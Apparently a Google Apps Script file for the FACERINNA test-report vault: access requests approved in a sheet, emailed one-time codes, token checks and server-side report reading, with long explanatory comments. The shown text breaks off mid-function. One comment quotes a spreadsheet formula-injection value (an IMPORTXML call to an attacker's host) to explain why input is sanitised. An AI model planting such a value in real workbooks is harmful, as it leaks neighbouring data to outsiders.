/* FACERINNA vault access — request, approve in the sheet, read the reports.
 *
 * WHAT IT IS FOR
 *   The test-reports vault is open: anyone holding its address reads 155 rows
 *   of report numbers, laboratories, dates, parameters and claim text. This
 *   closes it the way the events form already works — a visitor asks, you
 *   approve in a sheet, and only then do the rows exist for them.
 *
 *   The rows are served BY THIS SCRIPT, from the workbooks, after the token is
 *   checked. They stop being baked into the published page. That distinction
 *   is the whole thing: a gate over a page that still carries its data is a
 *   lock on a door standing beside an open window, and this project has
 *   already shipped that mistake once.
 *
 *   The sheet is the admin panel. Approving is typing `approved` in a cell.
 *   Revoking is typing anything else. There is no admin API and no admin
 *   password, because either would have to live somewhere, and the only
 *   somewhere on a static site is the page.
 *
 * =====================================================================
 *  THIS IS YOUR THIRD APPS SCRIPT PROJECT. IT NEEDS ITS OWN.
 * =====================================================================
 *
 *      1. events registration   AKfycbzYlL4-6rWb...
 *      2. booth scores          AKfycbx4zwbrto2iEUu...
 *      3. vault access          <- this one, and it must be a NEW project
 *
 *   A project has exactly one doPost. Pasting this into either of the two
 *   above REPLACES theirs and takes that feature off the air at the URL it has
 *   always answered on. That happened on 9 Sept: this pattern went into the
 *   registration project and broke event sign-ups the night before the AGM.
 *
 *   Before you hand me the /exec URL, check it starts with neither
 *   "AKfycbzYlL4" nor "AKfycbx4zwb". If it does, the new-project step went
 *   wrong and nothing else here matters.
 *
 * SET UP
 *   1. script.google.com -> New project.  Not Extensions -> Apps Script.
 *   2. Paste this whole file. Fill in VAULT_URL below.
 *   3. Run -> setUp once. Grant the permissions, including the one for
 *      sending mail — that is what delivers the approval links.
 *   4. Deploy -> New deployment -> Web app.
 *        Execute as:      Me
 *        Who has access:  Anyone      <- not "Anyone with Google account"
 *   5. Send me the /exec URL and I will wire the page to it.
 *
 *   Re-deploy after ANY edit: Deploy -> Manage deployments -> pencil ->
 *   Version: New version. Editing alone changes nothing that is live.
 *
 * WHY THIS AND NOT FIREBASE
 *   The one thing that killed the Supabase attempt was mail: its built-in
 *   sender only delivers to members of your Supabase organisation, and a
 *   dermatologist at an AGM is not one. Apps Script sends from your own Gmail
 *   — 100 recipients a day on a consumer account, 1500 on Workspace — with no
 *   such restriction and no domain to verify. setUp reports your remaining
 *   quota so the number is never a guess.
 *
 * HOW A PERSON GETS IN (since 24 Sept 2026)
 *   Approving a row mails them to say so -- no link in it. On the vault page
 *   they type their email, get a six-digit code, type it once, and that
 *   device stays signed in for good. Any device, the same way, once each.
 *   There is no expiry. What ends it is the sheet: delete their row, or set
 *   its status to anything but "approved", and every device they signed in
 *   on is refused on its next load.
 *
 *   It used to be a mailed link good for 14 days. The link landed in
 *   whichever browser opened the mail -- usually the mail app's own, not the
 *   one in the visitor's hand -- and died a fortnight later wherever it had
 *   landed. Links already sent still work, and now do not expire either.
 *
 * WHAT THIS DOES NOT DO
 *   It does not encrypt anything, and a signed-in device can be lent. What it
 *   gives you is a list of who asked, who you let in, and the ability to
 *   revoke any of them in one cell -- which is what "controlled access" means
 *   in practice for a booth.
 */

/* ------------------------------------------------------------------ config */

/* The workbook that holds the request list. The scores workbook is fine —
   a separate TAB in the same book, not a separate book. */
var SHEET_ID = '1J9QAO7PUO4caLhDBsKMGZ5tofv4Gqy5-QSVlo_hBEso';
var REQ_TAB  = 'Vault requests';

/* Where an approved link should land. Must be the vault page's real address,
   because the link in the email is built from it. */
var VAULT_URL = 'https://my.facerinna.com/facerinna-test-reports-claims/';

/* The workbooks the reports actually live in, and the tabs inside them. These
   are the same ids and gids build-public.js reads, moved server-side: the
   page stops carrying them, so view-source stops being a way in. */
var REPORTS_BOOK = '15eD6XtMVN1BRm41cD9wm33QMwW16R5sS';
var THUMBS_BOOK  = '1F1zDeTnSrfZ7j7bIu7FfiHRW0eoXu3_n4NjFAmnWBfE';
var GIDS = { reports: 378921450, series: 610219740, skus: 1440505952, thumbs: 524451717 };

/* A signed-in device stays signed in until the row says otherwise; there is
   no clock on it. The six-digit code is how a device signs in: it is mailed
   to the approved address, it is worth one use, and it buys the row's token,
   the same one on every device that address signs in on. */
var CODE_MINS  = 10;     /* a code is worth nothing after this long */
var CODE_TRIES = 5;      /* wrong guesses before that code is dead */
var CODE_GAP_MS = 60000; /* one code a minute per address */
var FROM_NAME  = 'FACERINNA Regulatory Affairs';

/* Who is told when somebody asks. Nobody watches a spreadsheet at a booth, so
   without this a request can sit unseen all day. Leave it empty and the mail
   goes to whoever owns the script; set an address to send it elsewhere, or set
   it to '-' to switch the notice off entirely. */
var NOTIFY_TO = '';

/* The web app's own /exec address, used to build the Approve and Decline
   buttons in that notice. Left empty it is asked for at run time, which is
   right in every normal case; set it by hand only if the buttons ever come
   out pointing at /dev instead of /exec. */
var SELF_URL = '';

var REQ_HEADERS = ['asked', 'name', 'email', 'organisation', 'status',
                   'token', 'expires', 'link sent', 'note', 'key'];

var COL_STATUS = 5, COL_TOKEN = 6, COL_KEY = 10;

/* status column values, and what each one means:
     (blank) / pending   asked, not decided        -> no access
     approved            let in                    -> told by mail; signs in with a code
     anything else       refused, or revoked later -> access dies immediately  */

/* ------------------------------------------------------------------- setup */

function setUp() {
  var sh = reqTab_();
  var fresh = sh.getLastRow() === 0;
  if (fresh) sh.appendRow(REQ_HEADERS);
  /* Rewritten every run, not only on a fresh tab. A tab set up by an earlier
     version is missing the columns added since, and a header row that does not
     match REQ_HEADERS is how a value ends up read from the wrong column. */
  sh.getRange(1, 1, 1, REQ_HEADERS.length).setValues([REQ_HEADERS]).setFontWeight('bold');
  if (fresh) {
    sh.setFrozenRows(1);
    sh.setColumnWidth(1, 150);
    sh.setColumnWidth(3, 220);
  }
  /* Both are keys, not things to read. */
  sh.hideColumns(COL_TOKEN);
  sh.hideColumns(COL_KEY);
  var quota = MailApp.getRemainingDailyQuota();
  return 'Ready. Tab "' + REQ_TAB + '" has ' + Math.max(0, sh.getLastRow() - 1) +
         ' request(s). Mail quota left today: ' + quota + '.';
}

function reqTab_() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  return ss.getSheetByName(REQ_TAB) || ss.insertSheet(REQ_TAB);
}

function json_(o) {
  return ContentService.createTextOutput(JSON.stringify(o))
    .setMimeType(ContentService.MimeType.JSON);
}

/* --------------------------------------------------------------- requests */

/* Body: {action:'request', name, email, organisation, consent:true}
 * Back: {ok:true, already:false}
 *
 * An address that has already asked does not get a second row. Otherwise a
 * visitor tapping the button twice leaves you two rows to decide about, and
 * approving one while the other says pending is a state nobody can read.
 */
/* A spreadsheet cell that starts with = + - or @ is a FORMULA the moment the
   workbook is opened, not text. These rows carry what a stranger typed into a
   public form, so a "name" of =IMPORTXML("https://theirs/"&B2,"//a") would run
   in our workbook, with our access, and hand them the row next to it. A
   leading apostrophe makes Sheets keep the value as text; it does not show in
   the cell and it does not change what anybody reads. */
function cell_(v) {
  var s = String(v == null ? '' : v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

function requestAccess_(b) {
  var name  = String(b.name || '').trim().replace(/\s+/g, ' ').slice(0, 80);
  var email = String(b.email || '').trim().toLowerCase().slice(0, 120);
  var org   = String(b.organisation || '').trim().replace(/\s+/g, ' ').slice(0, 120);

  if (!name) return json_({ ok: false, error: 'Please give your name.' });
  /* Starts with a letter or a digit, so it can never be a spreadsheet
     formula. An address is looked up by its exact value, so it is the one
     field that cannot be made safe with a leading apostrophe. */
  if (!/^[A-Za-z0-9][^@\s]*@[^@\s]+\.[^@\s]+$/.test(email))
    return json_({ ok: false, error: 'That does not look like an email address.' });
  if (b.consent !== true)
    return json_({ ok: false, error: 'Please agree to the note about your details.' });

  /* The decision key. It is what makes the Approve and Decline buttons in the
     notice safe to press: unguessable, one per request, and it never leaves
     your mailbox. Without it those buttons would be a URL anyone could type. */
  var key = Utilities.getUuid();

  var lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    var sh = reqTab_();
    var found = findRow_(sh, email);
    if (found) return json_({ ok: true, already: true, status: found.status });
    sh.appendRow([new Date(), cell_(name), email, cell_(org), 'pending', '', '', '', '', key]);
  } finally {
    lock.releaseLock();
  }

  /* After the row is safely written, and never in a way that can undo it: a
     mail server having a bad minute must not turn a visitor's accepted
     request into an error on their screen. The row is the record; the notice
     is a convenience. */
  notifyNewRequest_(name, email, org, key);

  return json_({ ok: true, already: false });
}

/* Tells you a request has come in, so you do not have to keep the workbook
   open, and lets you decide from the mail itself. Silent on failure by
   design -- see the call site. */
function notifyNewRequest_(name, email, org, key) {
  try {
    if (NOTIFY_TO === '-') return;
    var to = NOTIFY_TO || Session.getEffectiveUser().getEmail();
    if (!to) return;
    MailApp.sendEmail({
      to: to,
      name: FROM_NAME,
      subject: 'Vault access requested: ' + name,
      htmlBody: noticeBody_(name, email, org, key)
    });
  } catch (e) {
    Logger.log('notify failed: ' + (e && e.message || e));
  }
}

function noticeBody_(name, email, org, key) {
  var body =
    '<p><b>' + esc_(name) + '</b> asked to read the FACERINNA test reports.</p>' +
    '<p>' + esc_(email) + (org ? '<br>' + esc_(org) : '') + '</p>';

  /* No buttons rather than broken buttons: if the address cannot be worked
     out, the mail still says who asked and where the list is. */
  var self = selfUrl_();
  if (self && key) {
    body += '<p>' +
      btn_(self + '?k=' + encodeURIComponent(key) + '&do=approve', 'Approve', '#1a7f37') +
      '&nbsp;&nbsp;' +
      btn_(self + '?k=' + encodeURIComponent(key) + '&do=decline', 'Decline', '#8a1c1c') +
      '</p>' +
      '<p style="color:#667;font-size:13px">Each button opens a page that asks ' +
      'you to confirm. Nothing changes until you press the button on that page, ' +
      'so a mail scanner following these links decides nothing.</p>';
  }

  body += '<p style="color:#667;font-size:13px">You can also set the row\'s ' +
          '<b>status</b> to <b>approved</b> by hand in the "' + esc_(REQ_TAB) +
          '" tab. Either way the link is mailed to them on its own.</p>' +
          '<p><a href="https://docs.google.com/spreadsheets/d/' + SHEET_ID + '/edit">' +
          'Open the request list</a></p>';
  return body;
}

function btn_(href, label, colour) {
  return '<a href="' + href + '" style="display:inline-block;padding:11px 22px;' +
         'background:' + colour + ';color:#fff;text-decoration:none;border-radius:6px;' +
         'font-weight:600;font-family:system-ui,sans-serif">' + label + '</a>';
}

/* Asked for at run time rather than stored, so a redeployment cannot leave a
   stale address baked into every future mail. */
function selfUrl_() {
  if (SELF_URL) return SELF_URL;
  try { return ScriptApp.getService().getUrl() || ''; }
  catch (e) { return ''; }
}

function findRow_(sh, email) {
  var last = sh.getLastRow();
  if (last < 2) return null;
  var v = sh.getRange(2, 1, last - 1, REQ_HEADERS.length).getValues();
  for (var i = 0; i < v.length; i++) {
    if (String(v[i][2]).trim().toLowerCase() === email) {
      return { row: i + 2, name: v[i][1], email: email,
               status: String(v[i][4] || '').trim().toLowerCase(),
               token: String(v[i][5] || '').trim(),
               expires: v[i][6] ? new Date(v[i][6]).getTime() : 0,
               sent: v[i][7] };
    }
  }
  return null;
}

/* -------------------------------------------------------------- approvals */

/* Tells every row that is approved and has not been told yet. Run it by hand
 * from the editor if you like, but installTriggers() below means you do not
 * have to: it fires on the edit that approves a row, and again every five
 * minutes as a net. Safe to run at any moment, as often as you like -- a row
 * whose "link sent" cell is filled is never mailed twice.
 *
 * The mail carries no key. It says they are in and how to sign in: the vault
 * address, their email, a code. A key in a mail is a key in whichever
 * browser opens the mail, and that was the whole trouble with the old link.
 */
function sendApprovals() {
  /* Two callers can land at the same moment: the edit trigger and the timer.
     Without the lock both would see the same untold row and both would mail.
     tryLock, not waitLock: if another run holds it, that run is doing this. */
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(3000)) return 'Another run is already sending.';
  try {
    return sendApprovals_();
  } finally {
    lock.releaseLock();
  }
}

function sendApprovals_() {
  var sh = reqTab_();
  var last = sh.getLastRow();
  if (last < 2) return 'No requests yet.';

  var v = sh.getRange(2, 1, last - 1, REQ_HEADERS.length).getValues();
  var sent = 0, skipped = 0, failed = [];

  for (var i = 0; i < v.length; i++) {
    var status = String(v[i][4] || '').trim().toLowerCase();
    var told   = v[i][7];
    if (status !== 'approved' || told) { skipped++; continue; }

    var email = String(v[i][2]).trim();
    var name  = String(v[i][1]).trim();

    try {
      MailApp.sendEmail({
        to: email,
        name: FROM_NAME,
        subject: 'You can now open the FACERINNA test report vault',
        htmlBody:
          '<p>Hello ' + esc_(name) + ',</p>' +
          '<p>Your request to read the FACERINNA test reports and claims has been ' +
          'approved.</p>' +
          '<p><b>To sign in:</b> open <a href="' + VAULT_URL + '">' + esc_(VAULT_URL) + '</a>, ' +
          'choose <i>Sign in with a code</i> and enter ' + esc_(email) + '. We email you a ' +
          'six-digit code; type it in and you are in.</p>' +
          '<p>Each phone or computer asks for a code once. After that it stays signed ' +
          'in -- no link to keep, nothing to type again.</p>' +
          '<p style="color:#667;font-size:13px">Access is granted to you personally and ' +
          'can be withdrawn. FACERINNA Regulatory Affairs</p>'
      });
      /* Written only after the mail is away. Crash before this and the row is
         still untold, so the next run tries again rather than leaving somebody
         approved on paper and never told. */
      sh.getRange(i + 2, 8).setValue(new Date());
      sent++;
    } catch (e) {
      failed.push(email + ' (' + (e && e.message || e) + ')');
    }
  }

  var msg = 'Told ' + sent + ', skipped ' + skipped +
            '. Mail quota left: ' + MailApp.getRemainingDailyQuota() + '.';
  if (failed.length) msg += ' FAILED: ' + failed.join('; ');
  return msg;
}

var esc_ = function (s) {
  return String(s).replace(/[&<>"']/g, function (c) {
    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
  });
};

/* ------------------------------------------------------------ the reports */

/* Body: {action:'data', token}
 * Back: {ok:true, reports:[...], series:[...], skus:[...], thumbs:[...]}
 *       {ok:false, reason:'unknown'|'revoked'}   -- not let in
 *       {ok:false, reason:'readfail'}            -- let in, but the workbooks
 *                                                   could not be read
 *
 * readfail is its own reason because it is not a refusal. It used to fall
 * into the catch-all, come back with no reason at all, and the page took
 * that for "not let in": it threw away a sign-in that was perfectly good and
 * showed the request form to somebody who had just typed a correct code.
 */
function vaultData_(b) {
  var token = String(b.token || '').trim();
  if (!token) return json_({ ok: false, reason: 'unknown' });

  var sh = reqTab_();
  var last = sh.getLastRow();
  if (last < 2) return json_({ ok: false, reason: 'unknown' });

  var v = sh.getRange(2, 1, last - 1, REQ_HEADERS.length).getValues();
  for (var i = 0; i < v.length; i++) {
    if (String(v[i][5] || '').trim() !== token) continue;

    var status = String(v[i][4] || '').trim().toLowerCase();
    if (status !== 'approved') return json_({ ok: false, reason: 'revoked' });

    /* No expiry check: a signed-in device stays signed in until the row says
       otherwise. The "expires" column is left in place and no longer read. */
    var d;
    try { d = readVault_(); }
    catch (err) {
      /* The detail stays in the execution log. It names workbooks, and those
         ids are exactly what the page must never carry. */
      console.error('vault read failed: ' + (err && err.message || err));
      return json_({ ok: false, reason: 'readfail' });
    }
    d.ok = true;
    d.who = String(v[i][1] || '');
    return json_(d);
  }
  return json_({ ok: false, reason: 'unknown' });
}

/* Where a visitor checks on a request that has not been decided yet, without
   needing a token they do not have. Says only whether it is pending, which is
   what they asked and nothing more. */
function checkStatus_(b) {
  var email = String(b.email || '').trim().toLowerCase();
  if (!email) return json_({ ok: false, reason: 'unknown' });
  var found = findRow_(reqTab_(), email);
  if (!found) return json_({ ok: true, status: 'none' });
  if (found.status === 'approved')
    return json_({ ok: true, status: found.token ? 'approved' : 'approving' });
  return json_({ ok: true, status: found.status === 'pending' ? 'pending' : 'refused' });
}

/* ------------------------------------------------------- the one-time code

   Body: {action:'code', email}
   Back: {ok:true, status:'sent'|'pending'|'refused'|'none'}

   It answers with the row's real state rather than a blanket "if that address
   is approved we have sent something". The `status` action above already
   tells anyone the state of any address, so hiding it here would buy nothing
   and would leave a visitor whose request is still pending waiting on a mail
   that is never coming.                                                     */
function codeRequest_(b) {
  var email = String(b.email || '').trim().toLowerCase().slice(0, 120);
  if (!/^[A-Za-z0-9][^@\s]*@[^@\s]+\.[^@\s]+$/.test(email))
    return json_({ ok: false, error: 'That does not look like an email address.' });

  var found = findRow_(reqTab_(), email);
  if (!found) return json_({ ok: true, status: 'none' });
  if (found.status !== 'approved')
    return json_({ ok: true, status: found.status === 'pending' ? 'pending' : 'refused' });

  var props = PropertiesService.getScriptProperties();
  var slot = 'code:' + email;
  var prev = readCode_(props, slot);
  /* Asking twice in a minute re-sends nothing and mints nothing: without this
     a form held down is a mail bomb aimed at somebody else's inbox, and every
     fresh code would silently kill the one they are already typing in. */
  if (prev && (Date.now() - prev.made) < CODE_GAP_MS)
    return json_({ ok: true, status: 'sent', already: true });

  var code = sixDigits_();
  /* Mailed first, stored second. The other order leaves an address locked out
     for CODE_GAP_MS holding a code that never arrived. */
  MailApp.sendEmail({
    to: email,
    name: FROM_NAME,
    subject: 'Your FACERINNA vault code: ' + code,
    htmlBody:
      '<p>Hello ' + esc_(String(found.name || '')) + ',</p>' +
      '<p>Your one-time code for the FACERINNA test report vault is:</p>' +
      '<p style="font:700 28px/1.2 monospace;letter-spacing:4px">' + code + '</p>' +
      '<p style="color:#667;font-size:13px">Type it on the device you want to read ' +
      'on. It works once and stops working in ' + CODE_MINS + ' minutes; the ' +
      'device then stays signed in. If you did not ask for it, ignore this mail ' +
      'and tell us.</p>' +
      '<p style="color:#667;font-size:13px">FACERINNA Regulatory Affairs</p>'
  });
  props.setProperty(slot, JSON.stringify({
    h: codeHash_(email, code), exp: Date.now() + CODE_MINS * 60000,
    tries: 0, made: Date.now()
  }));
  return json_({ ok: true, status: 'sent' });
}

/* Body: {action:'redeem', email, code}
   Back: {ok:true, token} | {ok:false, reason:...}

   A spent code is deleted before the token goes out, so the same six digits
   can never buy a second one. */
function codeRedeem_(b) {
  var email = String(b.email || '').trim().toLowerCase().slice(0, 120);
  var code  = String(b.code || '').replace(/\D/g, '');
  var props = PropertiesService.getScriptProperties();
  var slot  = 'code:' + email;
  var rec   = readCode_(props, slot);

  if (!rec) return json_({ ok: false, reason: 'nocode' });
  if (Date.now() > rec.exp) { props.deleteProperty(slot); return json_({ ok: false, reason: 'codeexpired' }); }
  if (rec.tries >= CODE_TRIES) { props.deleteProperty(slot); return json_({ ok: false, reason: 'toomany' }); }

  if (!code || codeHash_(email, code) !== rec.h) {
    rec.tries++;
    props.setProperty(slot, JSON.stringify(rec));
    /* Each wrong one costs longer than the last, capped low: a long wait holds
       one of the script's execution slots, which is a cheaper thing to attack
       than six digits with five tries and ten minutes on them. */
    Utilities.sleep(Math.min(400 * rec.tries, 2000));
    return json_({ ok: false, reason: 'badcode', left: CODE_TRIES - rec.tries });
  }

  props.deleteProperty(slot);

  /* Read the row again rather than trusting the state it had when the code was
     asked for: a row revoked in those ten minutes must not still let someone
     in on a code minted while it was live. */
  var sh = reqTab_();
  var found = findRow_(sh, email);
  if (!found || found.status !== 'approved') return json_({ ok: false, reason: 'revoked' });

  /* One token per row, the same on every device the address signs in on,
     minted the first time and kept. Deleting the row is what ends it -- for
     every device at once -- and a row added back later mints a new one. */
  var token = found.token;
  if (!token) {
    token = Utilities.getUuid();
    sh.getRange(found.row, 6).setValue(token);
    if (!found.sent) sh.getRange(found.row, 8).setValue(new Date());
  }
  return json_({ ok: true, token: token });
}

function readCode_(props, slot) {
  try { var raw = props.getProperty(slot); return raw ? JSON.parse(raw) : null; }
  catch (e) { return null; }
}

function sixDigits_() {
  return String(Math.floor(Math.random() * 900000) + 100000);
}

/* Salted and hashed, so the stored copy is not itself a working code. The salt
   is minted once and lives with the script, never in the sheet. */
function codeHash_(email, code) {
  var props = PropertiesService.getScriptProperties();
  var salt = props.getProperty('code-salt');
  if (!salt) { salt = Utilities.getUuid(); props.setProperty('code-salt', salt); }
  var bytes = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, salt + '|' + email + '|' + code);
  return Utilities.base64Encode(bytes);
}

/* ---------------------------------------------------- reading the workbooks

   These mirror build-public.js exactly — same header hunt, same column order,
   same `none` -> empty rule. If the two ever disagree the page shows one thing
   before the lock and another after it, which reads as data loss.

   getDisplayValues, not getValues: the CSV export the build reads gives
   strings, and getValues would hand back Dates and numbers that stringify
   differently. Same grid, same text.                                        */

function tabByGid_(book, gid) {
  var sheets = SpreadsheetApp.openById(book).getSheets();
  for (var i = 0; i < sheets.length; i++)
    if (sheets[i].getSheetId() === gid) return sheets[i];
  throw new Error('no tab with gid ' + gid + ' in ' + book);
}

function grid_(book, gid) {
  try {
    var sh = tabByGid_(book, gid);
    return sh.getLastRow() ? sh.getDataRange().getDisplayValues() : [];
  } catch (first) {
    return csvGrid_(book, gid, first);
  }
}

/* The route build-public.js has always read these books by: the CSV export.
   SpreadsheetApp.openById only opens native Google Sheets -- a workbook that
   is an uploaded .xlsx, opened in Sheets, refuses it -- while the export
   answers for both. Asked with the script owner's own sign-in, so a book
   that is not shared publicly still answers. */
function csvGrid_(book, gid, first) {
  var url = 'https://docs.google.com/spreadsheets/d/' + book + '/export?format=csv&gid=' + gid;
  var res = UrlFetchApp.fetch(url, {
    headers: { Authorization: 'Bearer ' + ScriptApp.getOAuthToken() },
    muteHttpExceptions: true, followRedirects: true
  });
  if (res.getResponseCode() === 200) return Utilities.parseCsv(res.getContentText());
  var kind = '';
  try { kind = DriveApp.getFileById(book).getMimeType(); }
  catch (x) { kind = 'not visible to the account this script runs as'; }
  throw new Error('workbook ' + book + ' (' + kind + ') would not open: ' +
                  (first && first.message || first) + '; the CSV export answered ' +
                  res.getResponseCode());
}

var clean_ = function (v) {
  var t = (v == null ? '' : String(v)).trim();
  return t.toLowerCase() === 'none' ? '' : t;
};
var num_ = function (v) { var n = parseFloat(v); return isFinite(n) ? n : 0; };

/* Rows after the one whose first cell is "No.", keeping only those that start
   with a number — the sheets carry notes and spacer rows below the data. */
function bodyRows_(rows) {
  var h = -1;
  for (var i = 0; i < rows.length; i++)
    if (String(rows[i][0] || '').trim() === 'No.') { h = i; break; }
  if (h === -1) throw new Error('header row "No." not found');
  return rows.slice(h + 1).filter(function (r) {
    return /^\d+(\.\d+)?$/.test(String(r[0] || '').trim());
  });
}

function readVault_() {
  var rep = bodyRows_(grid_(REPORTS_BOOK, GIDS.reports)).map(function (r) {
    return { no: num_(r[0]), code: clean_(r[1]), sku: clean_(r[2]), reportNo: clean_(r[3]),
             lab: clean_(r[4]), date: clean_(r[5]), subject: clean_(r[6]), param: clean_(r[7]),
             claimsInstrument: clean_(r[8]), claimsPanel: clean_(r[9]), claimsOther: clean_(r[10]),
             genericClaims: clean_(r[11]), disclaimer: clean_(r[12]) };
  });
  var ser = bodyRows_(grid_(REPORTS_BOOK, GIDS.series)).map(function (r) {
    return { no: num_(r[0]), series: clean_(r[1]), skus: clean_(r[2]),
             genericClaims: clean_(r[3]), disclaimer: clean_(r[4]) };
  });
  var sku = bodyRows_(grid_(REPORTS_BOOK, GIDS.skus)).map(function (r) {
    return { no: num_(r[0]), code: clean_(r[1]), sku: clean_(r[2]), series: clean_(r[3]),
             aliases: clean_(r[4]), reportCount: num_(r[5]) };
  });
  return { reports: rep, series: ser, skus: sku, thumbs: readThumbs_() };
}

/* Pack-shot addresses only. The same tab also carries Test Report URL and
   Claims URL, pointing at internal Drive and Canva documents; those are not
   read here and must never be. */
function readThumbs_() {
  var rows = grid_(THUMBS_BOOK, GIDS.thumbs);
  var hi = -1;
  for (var i = 0; i < rows.length; i++) {
    for (var j = 0; j < rows[i].length; j++) {
      if (String(rows[i][j] || '').trim() === 'Image URL') { hi = i; break; }
    }
    if (hi !== -1) break;
  }
  if (hi === -1) throw new Error('"Image URL" header not found');

  var ix = {};
  rows[hi].forEach(function (h, i) { ix[String(h || '').trim()] = i; });

  var out = [];
  rows.slice(hi + 1).forEach(function (r) {
    var name = String(r[ix['Product Name']] || '').trim();
    if (!name) return;
    var u = String(r[ix['Image URL']] || '').trim();
    var m = u.match(/drive\.google\.com\/file\/d\/([\w-]+)/);
    out.push({ name: name,
               code: String(r[ix['SKU Code']] || '').trim(),
               img: m ? 'https://drive.google.com/thumbnail?id=' + m[1] + '&sz=w800' : u,
               reportUrl: '', claimsUrl: '' });
  });
  return out;
}

/* ------------------------------------------------------------- the web app */

function doPost(e) {
  try {
    var b = {};
    try { b = JSON.parse((e && e.postData && e.postData.contents) || '{}'); }
    catch (bad) { return json_({ ok: false, error: 'bad json' }); }

    switch (String(b.action || '')) {
      case 'request': return requestAccess_(b);
      case 'data':    return vaultData_(b);
      case 'status':  return checkStatus_(b);
      case 'code':    return codeRequest_(b);
      case 'redeem':  return codeRedeem_(b);
      default:        return json_({ ok: false, error: 'unknown action' });
    }
  } catch (err) {
    return json_({ ok: false, error: String(err && err.message || err) });
  }
}

/* Two jobs. With ?k= it is the page the Approve and Decline buttons in your
   notice open. Without it, it only says the script is alive -- handy for
   checking a deployment from the address bar without running anything.

   It never decides anything by itself. A GET that changed a status would be a
   loaded gun in an inbox: mail scanners and link-preview services follow URLs
   in mail without being asked, and one of them following "approve" would mail
   a stranger a working link. So this only ever draws a page; the decision
   goes back over google.script.run when you press the button on it. */
function doGet(e) {
  var p = (e && e.parameter) || {};
  if (!p.k) return json_({ ok: true, service: 'facerinna vault access', at: Date.now() });

  var want = String(p.do || '').toLowerCase();
  if (want !== 'approve' && want !== 'decline') want = 'approve';

  var found = validKey_(p.k) ? findByKey_(reqTab_(), String(p.k)) : null;
  if (!found) return page_('<h1>That link is not valid</h1>' +
    '<p>It may have been mistyped, or the row it belonged to was deleted. ' +
    'Open the request list and decide there.</p>');

  var isApprove = want === 'approve';
  return page_(
    '<h1>' + (isApprove ? 'Approve this request?' : 'Decline this request?') + '</h1>' +
    '<div class="who"><b>' + esc_(found.name) + '</b><br>' + esc_(found.email) +
      (found.org ? '<br>' + esc_(found.org) : '') + '</div>' +
    '<p class="now">Currently: <b>' + esc_(found.status || 'pending') + '</b>' +
      (found.token ? ' &middot; they have signed in' : '') + '</p>' +
    (isApprove
      ? '<p>Approving emails them to say they can sign in with a code.</p>'
      : '<p>Declining sends them nothing. If they are already signed in, it stops ' +
        'working on their next reload.</p>') +
    '<button id="go" class="' + (isApprove ? 'ok' : 'no') + '">' +
      (isApprove ? 'Yes, approve' : 'Yes, decline') + '</button>' +
    '<p id="out" class="out"></p>' +
    '<script>' +
    'var b=document.getElementById("go"),o=document.getElementById("out");' +
    'b.onclick=function(){b.disabled=true;o.textContent="Working\u2026";' +
    'google.script.run.withSuccessHandler(function(m){o.textContent=m;})' +
    '.withFailureHandler(function(err){b.disabled=false;' +
    'o.textContent="Did not go through: "+err.message;})' +
    '.decideFromPage(' + JSON.stringify(String(p.k)) + ',' + JSON.stringify(want) + ');};' +
    '<\/script>');
}

/* Called from the confirmation page above, over google.script.run. Public
   because that is the only kind of function google.script.run can reach. */
function decideFromPage(key, decision) {
  decision = String(decision || '').toLowerCase();
  if (decision !== 'approve' && decision !== 'decline') return 'Unknown decision.';
  if (!validKey_(key)) return 'That link is not valid.';

  var sh = reqTab_();
  var found = findByKey_(sh, String(key));
  if (!found) return 'That link is not valid.';

  sh.getRange(found.row, COL_STATUS).setValue(decision === 'approve' ? 'approved' : 'declined');

  if (decision === 'decline') {
    return 'Declined. ' + found.name + ' has been sent nothing' +
           (found.token ? ', and their signed-in devices stop working.' : '.');
  }
  /* Not left to the five-minute timer: you pressed a button and are watching
     the page, so the mail should be gone before you look away. */
  sendApprovals();
  return 'Approved. ' + found.email + ' has been emailed how to sign in.';
}

/* Shaped like a UUID or it is not one of ours. Checked before the value is
   ever put into the page, so a crafted k= cannot carry script with it. */
function validKey_(k) {
  return /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/
    .test(String(k || ''));
}

function findByKey_(sh, key) {
  var last = sh.getLastRow();
  if (last < 2) return null;
  var v = sh.getRange(2, 1, last - 1, REQ_HEADERS.length).getValues();
  for (var i = 0; i < v.length; i++) {
    if (String(v[i][COL_KEY - 1] || '').trim() !== key) continue;
    return { row: i + 2, name: String(v[i][1] || ''), email: String(v[i][2] || ''),
             org: String(v[i][3] || ''), status: String(v[i][4] || '').trim().toLowerCase(),
             token: String(v[i][5] || '').trim() };
  }
  return null;
}

function page_(inner) {
  return HtmlService.createHtmlOutput(
    '<meta name="viewport" content="width=device-width,initial-scale=1">' +
    '<style>' +
    'body{font:16px/1.55 system-ui,-apple-system,sans-serif;margin:0;padding:28px 22px;' +
    'color:#1a1a1a;background:#f6f7f9}' +
    'h1{font-size:20px;margin:0 0 16px}' +
    '.who{background:#fff;border:1px solid #dde;border-radius:8px;padding:14px 16px;margin:0 0 14px}' +
    '.now{color:#556;font-size:14px}' +
    'button{font:600 16px system-ui,sans-serif;color:#fff;border:0;border-radius:7px;' +
    'padding:14px 26px;cursor:pointer;width:100%;max-width:320px}' +
    'button:disabled{opacity:.5}' +
    '.ok{background:#1a7f37}.no{background:#8a1c1c}' +
    '.out{font-weight:600;margin-top:18px}' +
    '</style>' + inner)
    .setTitle('FACERINNA vault');
}

/* ------------------------------------------------------------ maintenance */

/* What the request list looks like, printed in the editor. */
function preview() {
  var sh = reqTab_(), last = sh.getLastRow();
  if (last < 2) return 'No requests yet.';
  var v = sh.getRange(2, 1, last - 1, REQ_HEADERS.length).getValues();
  var out = v.map(function (r) {
    return [String(r[4] || 'pending').toUpperCase().padEnd(9),
            String(r[2]), String(r[1]),
            r[5] ? 'signed in' : (r[7] ? 'told' : '')].join('  ');
  });
  Logger.log(out.join('\n'));
  return out.join('\n');
}

/* Reads the workbooks and reports what came back, without needing a token.
   Run this after setUp: if it cannot see the reports, nothing else will. */
function checkWorkbooks() {
  var msg;
  try {
    var d = readVault_();
    msg = 'OK: reports ' + d.reports.length + ', series ' + d.series.length +
